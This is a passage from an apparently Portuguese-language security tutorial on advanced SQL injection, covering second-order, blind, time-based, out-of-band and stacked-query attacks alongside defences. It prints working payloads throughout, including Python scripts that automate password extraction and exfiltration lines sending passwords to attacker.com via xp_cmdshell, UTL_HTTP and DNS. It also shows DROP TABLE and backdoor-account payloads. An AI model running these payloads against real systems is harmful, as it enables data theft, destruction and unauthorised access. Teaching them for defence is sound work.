---
layout: default
title: "05-sqli-avancado"
---

# Capitulo 5: SQL Injection - Tecnicas Avancadas

## Sumario

- [5.1 Second-Order Injection](#51-second-order-injection)
- [5.2 Blind SQL Injection - Boolean-Based](#52-blind-sql-injection---boolean-based)
- [5.3 Time-Based Blind Injection](#53-time-based-blind-injection)
- [5.4 Out-of-Band Injection](#54-out-of-band-injection)
- [5.5 Stacked Queries](#55-stacked-queries)
- [5.6 HTTP Header Injection](#56-http-header-injection)
- [5.7 XML/JSON Injection que Conduz a SQLi](#57-xmljson-injection-que-conduz-a-sqli)
- [5.8 SQL Injection em APIs REST](#58-sql-injection-em-apis-rest)
- [5.9 SQL Injection em GraphQL](#59-sql-injection-em-graphql)
- [5.10 Exemplo: Ataque Completo Step-by-Step](#510-exemplo-ataque-completo-step-by-step)
- [5.11 Ferramentas: SQLMap](#511-ferramentas-sqlmap)
- [5.12 Ferramentas: Havij](#512-ferramentas-havij)
- [5.13 Defesas Avancadas](#513-defesas-avancadas)

---

## 5.1 Second-Order Injection

### Conceito Fundamental

Second-order injection (tambem conhecida como stored SQL injection) e uma forma de SQL injection onde o payload malicioso e armazenado no banco de dados durante a primeira requisicao e executado posteriormente em uma segunda query. Diferente da SQL injection classica (first-order), onde a injecao e executada imediatamente, a second-order injection envolve dois momentos distintos: armazenamento e execucao.

### Mecanismo de Funcionamento

O fluxo de uma second-order injection segue quatro etapas:

```
Etapa 1: Injecao
Atacante envia dados maliciosos para um campo que sera armazenado
Ex: nome = admin'--

Etapa 2: Armazenamento
A aplicacao armazena o dado malicioso no banco de dados
O dado e persistido com o payload intacto

Etapa 3: Recuperacao
Uma funcao posterior recupera o dado armazenado
O dado malicioso e carregado em memoria

Etapa 4: Execucao
O dado recuperado e incorporado a uma nova query SQL
A injecao e executada quando a segunda query roda
```

### Diferenca entre First-Order e Second-Order

**First-order SQL injection:**
- O payload e injetado e executado na mesma requisicao
- O atacante observa o resultado imediatamente
- Mais facil de detectar e prevenir
- Vulnerabilidades em campos de formulario, URL, headers

**Second-order SQL injection:**
- O payload e injetado em uma requisicao e executado em outra
- O atacante precisa de duas ou mais interacoes
- Mais dificil de detectar porque o ataque nao e imediato
- Vulnerabilidades em campos que sao armazenados e reutilizados

### Cenarios Tipicos de Second-Order Injection

**Cenario 1: Alteracao de perfil de usuario**

```sql
-- Requisicao 1: Atacante atualiza seu username
-- Payload: admin'--
-- Query executada:
UPDATE users SET username = 'admin''--' WHERE id = 42

-- Requisicao 2: Administrador busca usuario
-- Query executada:
SELECT * FROM users WHERE username = 'admin'--'
-- Resultado: Retorna o usuario admin, nao o atacante
```

**Cenario 2: Comentario em publicacao**

```sql
-- Requisicao 1: Atacante posta um comentario
-- Payload: legal!'; UPDATE users SET role='admin' WHERE username='atacante';--
-- Query executada:
INSERT INTO comments (user_id, content) VALUES (42, 'legal!''; UPDATE users SET role=''admin'' WHERE username=''atacante'';--')

-- Requisicao 2: Sistema exibe estatisticas (query interna)
-- Query executada:
SELECT content, COUNT(*) FROM comments GROUP BY content
-- A injecao pode ser acionada dependendo de como o dado e processado
```

**Cenario 3: Campo de endereco/cidade**

```sql
-- Requisicao 1: Cadastro com cidade maliciosa
-- Payload: São Paulo' OR 1=1--
-- Query executada:
INSERT INTO addresses (user_id, city) VALUES (42, 'São Paulo'' OR 1=1--')

-- Requisicao 2: Listagem de usuarios por cidade
-- Query executada:
SELECT u.name, a.city FROM users u
JOIN addresses a ON u.id = a.user_id
WHERE a.city = 'São Paulo' OR 1=1--'
-- Retorna todos os usuarios
```

### Exemplo Completo de Second-Order Injection

```python
# Aplicacao vulneravel a second-order injection

# Cadastro de usuario (Requisicao 1)
@app.route('/register', methods=['POST'])
def register():
    username = request.form['username']
    email = request.form['email']
    password = request.form['password']
    
    # VULNERAVEL: armazenamento sem sanitizacao
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO users (username, email, password_hash) VALUES (?, ?, ?)",
        (username, email, hash_password(password))
    )
    conn.commit()
    return jsonify({"success": True})

# Funcao que recupera e usa o username (Requisicao 2)
def get_user_profile(user_id):
    conn = get_db()
    cursor = conn.cursor()
    
    # Recuperar username armazenado
    cursor.execute("SELECT username FROM users WHERE id = ?", (user_id,))
    username = cursor.fetchone()[0]
    
    # VULNERAVEL: usar o username armazenado em nova query
    # Se username for "admin'--", a query se torna:
    # SELECT * FROM user_profiles WHERE username = 'admin'--'
    cursor.execute(
        "SELECT * FROM user_profiles WHERE username = '" + username + "'"
    )
    return cursor.fetchone()

# Versao SEGURO
def get_user_profile_safe(user_id):
    conn = get_db()
    cursor = conn.cursor()
    
    # Recuperar username armazenado
    cursor.execute("SELECT username FROM users WHERE id = ?", (user_id,))
    username = cursor.fetchone()[0]
    
    # SEGURO: parameterized query
    cursor.execute(
        "SELECT * FROM user_profiles WHERE username = ?",
        (username,)
    )
    return cursor.fetchone()
```

### Prevencao contra Second-Order Injection

**Principio 1: Sanitizar antes de armazenar**

```python
# Sanitizar dados antes de salvar no banco
def sanitize_input(value):
    # Remover ou escapar caracteres perigosos
    dangerous_chars = ["'", '"', ";", "--", "/*", "*/"]
    for char in dangerous_chars:
        value = value.replace(char, "")
    return value

# Mas NUNCA depender apenas disso - usar parameterized queries tambem
```

**Principio 2: Usar parameterized queries SEMPRE**

```python
# Mesmo dados vindos do banco devem ser tratados como input
def get_user_profile_safe(user_id):
    conn = get_db()
    cursor = conn.cursor()
    
    # Recuperar username (parameterized)
    cursor.execute("SELECT username FROM users WHERE id = ?", (user_id,))
    username = cursor.fetchone()[0]
    
    # Usar parameterized query para a segunda query
    cursor.execute(
        "SELECT * FROM user_profiles WHERE username = ?",
        (username,)
    )
    return cursor.fetchone()
```

**Principio 3: Validacao de tipo e formato**

```python
# Validar que o username recuperado corresponde ao formato esperado
import re

def get_user_profile_validated(user_id):
    conn = get_db()
    cursor = conn.cursor()
    
    cursor.execute("SELECT username FROM users WHERE id = ?", (user_id,))
    username = cursor.fetchone()[0]
    
    # Validar formato do username
    if not re.match(r'^[a-zA-Z0-9_]{3,50}$', username):
        raise ValueError("Invalid username format")
    
    # Agora seguro usar em query
    cursor.execute(
        "SELECT * FROM user_profiles WHERE username = ?",
        (username,)
    )
    return cursor.fetchone()
```

### Segunda Ordem em Aplicações Web Modernas

Em aplicacoes modernas, a second-order injection pode ocorrer em contextos inesperados:

```javascript
// Node.js: second-order via cache invalidation
async function getUserStats(userId) {
    // Buscar username do cache ou banco
    let username = cache.get(`user:${userId}`);
    if (!username) {
        const [rows] = await pool.execute(
            'SELECT username FROM users WHERE id = ?', [userId]
        );
        username = rows[0].username;
        cache.set(`user:${userId}`, username, 3600);
    }
    
    // VULNERAVEL: usar username armazenado em query dinamica
    const query = `SELECT COUNT(*) as posts FROM posts WHERE author = '${username}'`;
    const [result] = await pool.execute(query);
    return result[0].posts;
}

// SEGURO
async function getUserStatsSafe(userId) {
    let username = cache.get(`user:${userId}`);
    if (!username) {
        const [rows] = await pool.execute(
            'SELECT username FROM users WHERE id = ?', [userId]
        );
        username = rows[0].username;
        cache.set(`user:${userId}`, username, 3600);
    }
    
    const [result] = await pool.execute(
        'SELECT COUNT(*) as posts FROM posts WHERE author = ?',
        [username]
    );
    return result[0].posts;
}
```

---

## 5.2 Blind SQL Injection - Boolean-Based

### Principio

Blind SQL injection (boolean-based) ocorre quando a aplicacao nao retorna dados ou erros significativos devido a injecao SQL. Em vez disso, o atacante infere informacoes observando diferencas sutis no comportamento da aplicacao, como mudancas no conteudo da pagina, status HTTP, ou tamanho da resposta.

### Como Funciona

O atacante envia consultas condicionais e observa se a resposta indica verdadeiro ou falso:

```
Caso VERDADEIRO:
URL: http://target.com/products?id=1 AND 1=1
Resposta: Pagina normal, mostra produto

Caso FALSO:
URL: http://target.com/products?id=1 AND 1=2
Resposta: Pagina diferente, mostra erro ou vazio
```

A diferenca entre as respostas indica se a condicao e verdadeira ou falsa, permitindo ao atacante inferir dados bit a bit.

### Metodologia de Extracao

**Passo 1: Confirmar a vulnerabilidade**

```sql
-- Testar condicoes verdadeiras e falsas
' AND 1=1--     (resposta normal)
' AND 1=2--     (resposta diferente)
```

**Passo 2: Determinar comprimento de dados**

```sql
-- Determinar comprimento da versao do banco de dados
' AND LENGTH(version())=1--   (falso)
' AND LENGTH(version())=5--   (verdadeiro) -> versao tem 5 caracteres
```

**Passo 3: Extrair caractere por caractere**

```sql
-- Extrair primeiro caractere da versao
' AND ASCII(SUBSTRING(version(),1,1))=53--  (5 = '5')
' AND ASCII(SUBSTRING(version(),1,1))=54--  (6 = '6')

-- Extrair segundo caractere
' AND ASCII(SUBSTRING(version(),2,1))=46--  (46 = '.')
```

**Passo 4: Extrair dados de tabelas**

```sql
-- Determinar nome do banco de dados
' AND LENGTH(database())=1--
' AND LENGTH(database())=12--  (production_db = 12 caracteres)

-- Extrair nome do banco caractere por caractere
' AND ASCII(SUBSTRING(database(),1,1))=112--  (112 = 'p')
' AND ASCII(SUBSTRING(database(),2,1))=114--  (114 = 'r')
' AND ASCII(SUBSTRING(database(),3,1))=111--  (111 = 'o')
```

### Diferencas na Resposta

O atacante precisa identificar um indicador claro de verdadeiro/falso. Os mais comuns:

**Diferenca no conteudo da pagina:**
```
Verdadeiro: <div class="product">Laptop</div>
Falso: <div class="not-found">Product not found</div>
```

**Diferenca no status HTTP:**
```
Verdadeiro: HTTP 200 OK
Falso: HTTP 302 Redirect ou HTTP 404 Not Found
```

**Diferenca no tamanho da resposta:**
```
Verdadeiro: 15432 bytes
Falso: 14876 bytes
```

**Diferenca em headers especificos:**
```
Verdadeiro: X-Custom-Header: present
Falso: X-Custom-Header: absent
```

### Extracao de Dados Metodica

```sql
-- Determinar numero de tabelas
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=1--
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=5--  (5 tabelas)

-- Determinar nome da primeira tabela (comprimento)
' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=6--
-- 'users' = 6 caracteres

-- Extrair nome da primeira tabela caractere por caractere
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))=117--
-- 117 = 'u'
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),2,1))=115--
-- 115 = 's'
-- Resultado: "users"
```

### Optimizacao da Extracao

A extracao caractere por caractere e extremamente lenta. Algumas tecnicas aceleram o processo:

**Busca binaria**: Em vez de testar cada caractere individualmente, usar busca binaria para reduzir o numero de requisicoes:

```sql
-- Busca binaria para caractere
-- Intervalo: 32-126 (caracteres imprimiveis)
' AND ASCII(SUBSTRING(version(),1,1))>80--  (metade superior: 81-126)
' AND ASCII(SUBSTRING(version(),1,1))>103-- (metade: 104-126)
' AND ASCII(SUBSTRING(version(),1,1))>115-- (metade: 116-126)
' AND ASCII(SUBSTRING(version(),1,1))>119-- (metade: 120-126)
' AND ASCII(SUBSTRING(version(),1,1))>117-- (metade: 118-126)
' AND ASCII(SUBSTRING(version(),1,1))=119-- (encontrado: 119 = 'w')

-- Em media, busca binaria precisa de ~7 requisicoes por caractere
-- vs ~95 requisicoes para busca sequencial
```

**Comparacao de substrings**: Em vez de comparar caractere por caractere, comparar substrings maiores:

```sql
-- Comparar 4 caracteres por vez
' AND SUBSTRING(version(),1,4)='5.7.'--   (verdadeiro)
' AND SUBSTRING(version(),5,1)='3'--       (verdadeiro)
-- Resultado: "5.7.3"
```

**Uso de BETWEEN**: Reduzir o numero de comparacoes usando ranges:

```sql
-- Em vez de testar cada valor individualmente
' AND ASCII(SUBSTRING(version(),1,1)) BETWEEN 118 AND 120--  (verdadeiro -> 118, 119, ou 120)
' AND ASCII(SUBSTRING(version(),1,1)) BETWEEN 118 AND 119--  (verdadeiro -> 118 ou 119)
' AND ASCII(SUBSTRING(version(),1,1))=119--                   (verdadeiro -> 'w')
```

### Automatizacao com Scripts

```python
import requests
import string

def blind_sqli_extract(url, column, table, db_length=None):
    """Extrai dados via blind SQL injection boolean-based."""
    
    result = ""
    
    # Determinar comprimento se nao fornecido
    if db_length is None:
        for length in range(1, 100):
            payload = f"' AND LENGTH((SELECT {column} FROM {table} LIMIT 0,1))={length}--"
            response = requests.get(url, params={"id": f"1 {payload}"})
            if "product" in response.text.lower():
                db_length = length
                break
    
    # Extrair caractere por caractere
    for i in range(1, db_length + 1):
        for char in range(32, 127):
            payload = (
                f"' AND ASCII(SUBSTRING("
                f"(SELECT {column} FROM {table} LIMIT 0,1),{i},1))"
                f"={char}--"
            )
            response = requests.get(url, params={"id": f"1 {payload}"})
            if "product" in response.text.lower():
                result += chr(char)
                print(f"Position {i}: {chr(char)} -> {result}")
                break
    
    return result

# Uso
url = "http://target.com/products"
data = blind_sqli_extract(url, "password", "users")
print(f"Extracted: {data}")
```

### Blind SQL injection com Diferentes SGBDs

**MySQL:**

```sql
-- MySQL: substr e substring sao equivalentes
' AND LENGTH(database())=12--
' AND ASCII(SUBSTR(database(),1,1))=112--
```

**PostgreSQL:**

```sql
-- PostgreSQL: usa LENGTH e SUBSTRING
' AND LENGTH(current_database())=12--
' AND ASCII(SUBSTRING(current_database() FROM 1 FOR 1))=112--
```

**SQL Server:**

```sql
-- SQL Server: usa LEN e SUBSTRING
' AND LEN(DB_NAME())=12--
' AND ASCII(SUBSTRING(DB_NAME(),1,1))=112--

-- SQL Server: pode usar DATALENGTH para verificacao
' AND DATALENGTH(DB_NAME())=24--  (Unicode: 2 bytes por caractere)
```

**Oracle:**

```sql
-- Oracle: usa LENGTH e SUBSTR
' AND LENGTH(SYS.LOGIN_USER)=12--
' AND ASCII(SUBSTR(SYS.LOGIN_USER,1,1))=112--
```

### Deteccao de Blind SQL Injection

**No lado do servidor:**
- Monitorar tempo de resposta de queries
- Detectar padroes de requisicoes repetitivas
- Analisar logs de queries para padroes suspeitos

**No lado do WAF:**
- Detectar operacoes como LENGTH, SUBSTRING, ASCII em sequencia
- Identificar multiplas requisicoes com padroes similares
- Bloquear IPs que fazem muitas requisicoes condicionais

---

## 5.3 Time-Based Blind Injection

### Principio

Time-based blind injection utiliza funcoes de temporizacao do banco de dados para inferir informacoes. Quando a aplicacao nao retorna dados ou diferencas na resposta, o atacante pode medir o tempo que a query leva para executar. Se uma condicao e verdadeira, o banco de dados pode ser forçado a aguardar (sleep) antes de retornar, criando um atraso observavel.

### Funcoes de Temporizacao por SGBD

**MySQL:**

```sql
-- SLEEP(): pausa por N segundos
' AND IF(1=1, SLEEP(5), 0)--   (5 segundos de atraso se verdadeiro)
' AND IF(1=2, SLEEP(5), 0)--   (sem atraso se falso)

-- BENCHMARK(): executa uma operacao N vezes
' AND IF(1=1, BENCHMARK(10000000, SHA1('test')), 0)--  (lento se verdadeiro)

-- Exemplo pratico
' AND IF(LENGTH(database())=12, SLEEP(5), 0)--
-- Se o nome do banco tem 12 caracteres, a resposta atrasa 5 segundos
```

**PostgreSQL:**

```sql
-- PostgreSQL nao tem SLEEP(), mas pode usar pg_sleep()
' AND CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END--
' AND CASE WHEN 1=1 THEN (SELECT pg_sleep(5)) ELSE '0' END--

-- Alternativa: usar generate_series para causar atraso
' AND CASE WHEN 1=1 THEN (SELECT pg_sleep(5)) ELSE '0' END--
```

**SQL Server:**

```sql
-- SQL Server: WAITFOR DELAY
' ; IF 1=1 WAITFOR DELAY '0:0:5'--
' ; IF (1=1) BEGIN WAITFOR DELAY '0:0:5' END--

-- SQL Server: mais preciso
' ; DECLARE @t DATETIME=GETDATE(); IF 1=1 WAITFOR DELAY '0:0:5'; IF DATEDIFF(SECOND,@t,GETDATE())>=5 PRINT 'true'--
```

**Oracle:**

```sql
-- Oracle: DBMS_PIPE.RECEIVE_MESSAGE
' AND CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END FROM dual--

-- Oracle: mais simples
' AND CASE WHEN 1=1 THEN (SELECT DBMS_LOCK.SLEEP(5) FROM dual) ELSE 0 END FROM dual--
```

### Metodologia de Extracao

```sql
-- Determinar comprimento do nome do banco de dados
' AND IF(LENGTH(database())=12, SLEEP(5), 0)--
-- Medir tempo: se atraso >= 5 segundos, comprimento e 12

-- Extrair caractere por caractere
' AND IF(ASCII(SUBSTRING(database(),1,1))=112, SLEEP(5), 0)--
-- Medir tempo: se atraso >= 5 segundos, primeiro caractere e 'p'

-- Extrair dados de tabela
' AND IF(ASCII(SUBSTRING(
  (SELECT table_name FROM information_schema.tables
   WHERE table_schema=database() LIMIT 0,1),1,1))=117,
  SLEEP(5), 0)--
-- Se atraso: primeiro caractere da primeira tabela e 'u' (users)
```

### Calculo de Timeout

Para time-based injection, e crucial determinar um timeout adequado:

```python
import requests
import time

def time_based_extract(url, query, timeout=5, max_length=100):
    """Extrai dados via time-based blind injection."""
    
    result = ""
    
    # Determinar comprimento
    for length in range(1, max_length + 1):
        payload = f"' AND IF(LENGTH({query})={length}, SLEEP({timeout}), 0)--"
        start = time.time()
        requests.get(url, params={"id": f"1 {payload}"})
        elapsed = time.time() - start
        
        if elapsed >= timeout * 0.9:  # Margem de tolerancia
            print(f"Length: {length}")
            break
    
    # Extrair caracteres
    for i in range(1, length + 1):
        for char in range(32, 127):
            payload = (
                f"' AND IF(ASCII(SUBSTRING({query},{i},1))={char}, "
                f"SLEEP({timeout}), 0)--"
            )
            start = time.time()
            requests.get(url, params={"id": f"1 {payload}"})
            elapsed = time.time() - start
            
            if elapsed >= timeout * 0.9:
                result += chr(char)
                print(f"Position {i}: {chr(char)} -> {result}")
                break
    
    return result
```

### Time-Based Injection Avancado

**Multiplos SLEEPs para extrair mais dados por requisicao:**

```sql
-- MySQL: extrair 3 caracteres em uma requisicao
' AND IF(
  ASCII(SUBSTRING(database(),1,1))=112 AND
  ASCII(SUBSTRING(database(),2,1))=114 AND
  ASCII(SUBSTRING(database(),3,1))=111,
  SLEEP(5), 0)--
-- Atraso apenas se TODOS os 3 caracteres estiverem corretos
```

**Temporizacao adaptativa:**

```python
def adaptive_timeout(base_url, base_sleep=3):
    """Determina timeout ideal baseado na latencia da conexao."""
    
    # Medir latencia base
    start = time.time()
    requests.get(base_url)
    base_latency = time.time() - start
    
    # O timeout deve ser significativamente maior que a latencia base
    return max(base_sleep, base_latency * 3)
```

### Deteccao de Time-Based Injection

**No lado do servidor:**
- Monitorar queries com funcoes de temporizacao
- Detectar IF/CASE com SLEEP/WAITFOR
- Alertar sobre queries com tempo de execussao anormal

**No lado do WAF:**
- Bloquear SLEEP, BENCHMARK, WAITFOR em queries HTTP
- Detectar padroes de requisicoes com temporizacao
- Rate limiting para prevenir automatizacao

**No lado do banco de dados:**
- Configurar timeout maximo de queries
- Monitorar estatisticas de tempo de execucao
- Log de queries com tempo excessivo

---

## 5.4 Out-of-Band Injection

### Principio

Out-of-band injection usa canais auxiliares para extrair dados quando a injecao in-band e blind nao sao viaveis. O atacante fuerca o banco de dados a enviar dados para um servidor externo sob seu controle, geralmente por meio de requisicoes HTTP ou resolucao DNS.

### MySQL Out-of-Band

**LOAD_FILE comUNC path:**

```sql
-- Forcar MySQL a acessar share UNC
' UNION SELECT LOAD_FILE(CONCAT('\\\\',
  (SELECT password FROM users WHERE username='admin'),
  '.attacker.com\\share\\file.txt'))--

-- O MySQL tenta resolver o hostname:
-- admin_password_hash.attacker.com
```

**Intoe FILE comUNC path:**

```sql
-- Escrever dados em share UNC
' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share\\output.txt'--
```

### SQL Server Out-of-Band

**xp_cmdshell:**

```sql
-- SQL Server: executar comandos OS
' ; EXEC xp_cmdshell 'powershell -Command "Invoke-WebRequest -Uri http://attacker.com/exfil?data=(SELECT TOP 1 password FROM users)"'--

-- Alternativa com certificado
' ; EXEC xp_cmdshell 'certutil -urlcache -split -f http://attacker.com/data?pwd=(SELECT TOP 1 password FROM users) temp.txt'--
```

**UNC Path:**

```sql
-- SQL Server: acessar share UNC
' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share\\output.txt'--

-- SQL Server: mais controlado
' ; EXEC master..xp_dirtree '\\\\attacker.com\\share'--
```

### Oracle Out-of-Band

**UTL_HTTP.REQUEST:**

```sql
-- Oracle: requisicao HTTP a partir do banco de dados
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/exfil?pwd=' || (SELECT password FROM users WHERE rownum=1)) FROM dual--

-- Oracle: com SSL
' UNION SELECT UTL_HTTP.REQUEST('https://attacker.com/exfil?pwd=' || (SELECT password FROM users WHERE rownum=1)) FROM dual--
```

**UTL_INADDR:**

```sql
-- Oracle: resolver DNS
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE rownum=1) || '.attacker.com') FROM dual--
```

### PostgreSQL Out-of-Band

**dblink:**

```sql
-- PostgreSQL: conectar a servidor externo via dblink
' UNION SELECT dblink_connect('host=attacker.com dbname=exfil user=postgres password=pwd')--

-- PostgreSQL: executar query no servidor remoto
' UNION SELECT dblink_exec('INSERT INTO remote_log SELECT password FROM users')--
```

**pg_net (extensao):**

```sql
-- PostgreSQL: requisicao HTTP via pg_net
SELECT net.http_get('http://attacker.com/exfil?pwd=' || password FROM users WHERE username='admin');
```

### DNS Exfiltration Detalhado

```python
# Servidor DNS para capturar exfiltracao
from dnslib import DNSRecord, RR, A, CNAME
from dnslib.server import DNSServer, BaseResolver
import threading
import time

class DNSExfilResolver(BaseResolver):
    def __init__(self):
        self.captured = []
    
    def resolve(self, request, handler):
        qname = str(request.q.qname)
        print(f"[DNS CAPTURED] {qname}")
        self.captured.append(qname)
        
        reply = request.reply()
        reply.add_answer(RR(qname, A("127.0.0.1")))
        return reply

# Iniciar servidor DNS
resolver = DNSExfilResolver()
server = DNSServer(resolver, port=53, address="0.0.0.0")
thread = threading.Thread(target=server.start)
thread.daemon = True
thread.start()

# Aguardar dados
time.sleep(300)  # Aguardar 5 minutos

# Processar dados capturados
for entry in resolver.captured:
    # Formato: password_hash.attacker.com
    data = entry.split('.')[0]
    print(f"Extracted: {data}")
```

### Deteccao de Out-of-Band Injection

**No nivel de rede:**
- Monitorar trafego DNS incomum
- Detectar requisicoes HTTP incomuns a partir de servidores de banco de dados
- Alertar sobre acessos a shares UNC

**No nivel de banco de dados:**
- Desabilitar LOAD_FILE e INTO OUTFILE quando nao necessario
- Restringir xp_cmdshell e funcoes de rede
- Monitorar logs de queries com funcoes de rede

---

## 5.5 Stacked Queries

### Conceito

Stacked queries (queries empilhadas) permitem que multiplos statements SQL sejam executados em uma unica requisicao, separados por ponto-e-virgula. Essa tecnica e extremamente poderosa porque permite ao atacante executar queries completas como INSERT, UPDATE, DELETE, ou ate DDL (CREATE TABLE, DROP TABLE).

### Disponibilidade por SGBD

| SGBD | Stacked Queries | Padrao |
|------|-----------------|--------|
| MySQL | Suporta | Habilitado |
| PostgreSQL | Suporta | Habilitado |
| SQL Server | Suporta | Habilitado |
| Oracle | Nao suporta em bind variables | Limitado |
| SQLite | Suporta | Habilitado |

### Exemplos de Stacked Queries

**Insercao de dados:**

```sql
-- Inserir novo usuario administrador
'; INSERT INTO users (username, password_hash, role) VALUES ('hacker', 'hash_aqui', 'admin')--
```

**Atualizacao de dados:**

```sql
-- Promover usuario a administrador
'; UPDATE users SET role='admin' WHERE username='hacker'--
```

**Exclusao de dados:**

```sql
-- Deletar registros
'; DELETE FROM audit_logs WHERE 1=1--
'; DROP TABLE users--
```

**Exclusao de tabelas inteiras:**

```sql
-- SQL Server: sys.tables para encontrar tabelas
'; DROP TABLE sensitive_data;--

-- MySQL: concatenar multiplas exclusoes
'; DROP TABLE users; DROP TABLE sessions; DROP TABLE logs;--
```

**Criacao de usuarios:**

```sql
-- SQL Server: criar login e usuario
'; CREATE LOGIN hacker WITH PASSWORD='P@ssw0rd123';--
'; CREATE USER hacker FOR LOGIN hacker;--
'; ALTER ROLE db_owner ADD MEMBER hacker;--

-- MySQL: criar usuario
'; CREATE USER 'hacker'@'%' IDENTIFIED BY 'P@ssw0rd123';--
'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%';--
'; FLUSH PRIVILEGES;--
```

### Stacked Queries com Union

Combinar UNION com stacked queries para extracao e manipulacao simultaneas:

```sql
-- Extrair dados E inserir resultado em tabela auxiliar
' UNION SELECT password FROM users WHERE username='admin';
INSERT INTO temp_exfil (data) SELECT password FROM users WHERE username='admin'--
```

### Limitacoes de Stacked Queries

**Bibliotecas de banco de dados**: Algumas bibliotecas nao suportam multiplas queries em uma unica chamada:

```python
# MySQL Connector: execute() aceita multiplas queries
cursor.execute("SELECT 1; SELECT 2")  # Funciona

# psycopg2: execute() aceita multiplas queries
cursor.execute("SELECT 1; SELECT 2")  # Funciona

# sqlite3: execute() NAO aceita multiplas queries
cursor.execute("SELECT 1; SELECT 2")  # ERRO

# Go database/sql: exec() aceita multiplas queries
db.Exec("SELECT 1; SELECT 2")  # Funciona
```

**Linguagens web**: Algumas APIs web bloqueiam multiplas queries:

```php
// PHP mysql_query: NAO aceita multiplas queries (por seguranca)
mysqli_query($conn, "SELECT 1; SELECT 2");  // ERRO

// PHP PDO: aceita multiplas queries com configuracao
$pdo->exec("SELECT 1; SELECT 2");  # Funciona se ATTR_EMULATE_PREPARES=true
```

### Prevencao contra Stacked Queries

```python
# 1. Usar parameterized queries (impede injecao de estrutura)
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))

# 2. Configurar biblioteca para nao aceitar multiplas queries
# MySQL: useMultiStatements=False
conn = mysql.connector.connect(
    host='localhost',
    database='app',
    use_multi_statements=False  # Desabilitar
)

# 3. Validar entrada para nao conter ponto-e-virgula
def validate_no_stacked_queries(input_str):
    if ';' in input_str:
        raise ValueError("Invalid input: semicolons not allowed")
    return input_str
```

---

## 5.6 HTTP Header Injection

### Vetores de Injecao em Headers

Varios headers HTTP podem ser vetores de SQL injection:

```http
# Headers comuns que podem conter input do usuario

# User-Agent: frequentemente logado no banco de dados
User-Agent: Mozilla/5.0' OR 1=1--

# Referer: pode ser logado ou usado em queries
Referer: http://target.com/page?id=1' OR 1=1--

# X-Forwarded-For: usado para logging de IP
X-Forwarded-For: 127.0.0.1' OR 1=1--

# Cookie: session, user_id, etc.
Cookie: session=abc' OR 1=1--

# X-Custom-Header: qualquer header customizado
X-Custom-Header: test' OR 1=1--

# Accept-Language: pode ser logado
Accept-Language: pt-BR' OR 1=1--
```

### SQLi via User-Agent

```python
# Exemplo de aplicacao que loga User-Agent e e vulneravel
@app.before_request
def log_request():
    user_agent = request.headers.get('User-Agent', '')
    # VULNERAVEL: concatenacao direta
    conn = get_db()
    conn.execute(
        f"INSERT INTO request_logs (user_agent, path) VALUES ('{user_agent}', '{request.path}')"
    )
    conn.commit()

# Payload do atacante
# User-Agent: ' UNION SELECT username, password, 3 FROM users--
# A query de log se torna:
# INSERT INTO request_logs (user_agent, path) VALUES ('' UNION SELECT username, password, 3 FROM users--', '/page')
```

### SQLi via Cookie

```python
# Aplicacao que usa cookie de usuario em query
@app.route('/dashboard')
def dashboard():
    user_id = request.cookies.get('user_id')
    # VULNERAVEL: usar cookie diretamente em query
    conn = get_db()
    user = conn.execute(
        f"SELECT * FROM users WHERE id = {user_id}"
    ).fetchone()
    return render_template('dashboard.html', user=user)

# Payload do atacante
# Cookie: user_id=1 OR 1=1--
# A query se torna:
# SELECT * FROM users WHERE id = 1 OR 1=1--
```

### SQLi via X-Forwarded-For

```python
# Aplicacao que loga X-Forwarded-For
@app.before_request
def log_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    # VULNERAVEL
    conn = get_db()
    conn.execute(
        f"INSERT INTO access_logs (ip_address) VALUES ('{ip}')"
    )
    conn.commit()

# Payload: X-Forwarded-For: 1' UNION SELECT 1,2,3--
```

### SQLi via Referer

```python
# Aplicacao que analisa origem do trafego
@app.route('/track')
def track():
    referer = request.headers.get('Referer', 'direct')
    # VULNERAVEL
    conn = get_db()
    conn.execute(
        f"INSERT INTO traffic_logs (referer) VALUES ('{referer}')"
    )
    conn.commit()

# Payload: Referer: http://evil.com' UNION SELECT 1,2,3--
```

### SQLi em Multi-Step Headers

Alguns ataques combinam injecao em multiplos headers:

```sql
-- Step 1: Injecao via User-Agent para explorar
User-Agent: ' UNION SELECT 1,2,3--

-- Step 2: A aplicacao usa o resultado da query anterior
-- e o resultado e incorporado a outra query
Cookie: session=result_from_step1' OR 1=1--
```

### Prevencao contra Header Injection

```python
# 1. NUNCA usar headers HTTP diretamente em queries
@app.before_request
def log_request():
    user_agent = request.headers.get('User-Agent', '')
    # SEGURO: parameterized query
    conn = get_db()
    conn.execute(
        "INSERT INTO request_logs (user_agent, path) VALUES (?, ?)",
        (user_agent, request.path)
    )
    conn.commit()

# 2. Validar e sanitizar headers antes de usar
def sanitize_header(value):
    # Remover caracteres perigosos
    if not value:
        return ""
    # Limitar tamanho
    value = value[:255]
    # Remover aspas e pontos-e-virgula
    value = value.replace("'", "").replace('"', '').replace(';', '')
    return value

# 3. Usar parameterized queries para headers
@app.before_request
def log_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ip = sanitize_header(ip)
    conn = get_db()
    conn.execute(
        "INSERT INTO access_logs (ip_address) VALUES (?)",
        (ip,)
    )
    conn.commit()
```

---

## 5.7 XML/JSON Injection que Conduz a SQLi

### XML Injection para SQLi

Aplicacoes que processam XML e incorporam dados XML a queries SQL podem ser vulneraveis:

```xml
<!-- Payload XML com SQLi -->
<user>
  <name>admin' OR 1=1--</name>
  <email>test@test.com</email>
</user>
```

```python
